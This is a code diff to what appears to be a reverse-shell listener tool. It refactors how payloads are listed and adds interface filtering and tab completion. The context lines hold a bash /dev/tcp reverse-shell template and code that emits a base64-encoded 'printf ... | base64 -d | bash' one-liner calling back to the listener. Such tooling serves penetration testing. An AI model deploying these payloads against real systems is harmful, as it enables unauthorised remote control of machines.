@@ -127,9 +127,6 @@ class Interfaces:
 			table += [paint(name).cyan, paint(ip).yellow]
 		return str(table)
 
-	def oneLine(self):
-		return '(' + str(self).replace('\n', '|') + ')'
-
 	def translate(self, interface_name):
 		if interface_name in self.list:
 			return self.list[interface_name]
@@ -1357,7 +1354,7 @@ class MainMenu(BetterCMD):
 		if core.listeners:
 			print()
 			for listener in core.listeners.values():
-				print(listener.payloads, end='\n\n')
+				print(listener.payloads(line))
 		else:
 			cmdlogger.warning("No Listeners to show payloads")
 
@@ -1480,6 +1477,9 @@ class MainMenu(BetterCMD):
 			return [_type for _type in ("tcp",) if _type.startswith(text)]
 		elif arg == 'stop':
 			return self.get_core_id_completion(text, "*", attr='listeners')
+
+	def complete_payloads(self, text, line, begidx, endidx):
+		return [iface for iface in Interfaces().list if iface.startswith(text)]
 
 	def complete_upload(self, text, line, begidx, endidx):
 		return __class__.file_completer(text)
@@ -1870,7 +1870,7 @@ class TCPListener:
 		core.control << "" # TODO
 
 		if options.payloads:
-			print(self.payloads)
+			print(self.payloads())
 
 	def stop(self):
 
@@ -1893,8 +1893,7 @@ class TCPListener:
 		else:
 			logger.warning(f"Stopping {self}")
 
-	@property
-	def payloads(self):
+	def payloads(self, interface_filter=None):
 		interfaces = Interfaces().list
 		presets = [
 			"(bash >& /dev/tcp/{}/{} 0>&1) &",
@@ -1909,8 +1908,12 @@ class TCPListener:
 		if self.host == '0.0.0.0':
 			ips = [ip for ip in interfaces.values()]
 
+		interface_count = 0
 		for ip in ips:
 			iface_name = {v: k for k, v in interfaces.items()}.get(ip)
+			if interface_filter and iface_name != interface_filter:
+				continue
+			interface_count += 1
 			output.extend((f'➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}', ''))
 			output.append(str(paint("Bash TCP").UNDERLINE))
 			output.append(f"printf {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
@@ -1930,7 +1933,9 @@ class TCPListener:
 			""").split("\n"))
 
 		output.append("─" * 80)
-		return '\n'.join(output)
+		if not interface_count:
+			return ""
+		return '\n'.join(output) + "\n"
 
 
 class Channel:
@@ -4905,7 +4910,7 @@ def listener_menu():
 				termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
 				print()
 				for listener in core.listeners.values():
-					print(listener.payloads, end='\n\n')
+					print(listener.payloads(), end='\n\n')
 			elif command == '\x0C':
 				os.system("clear")
 			elif command in ('q', '\x03'):
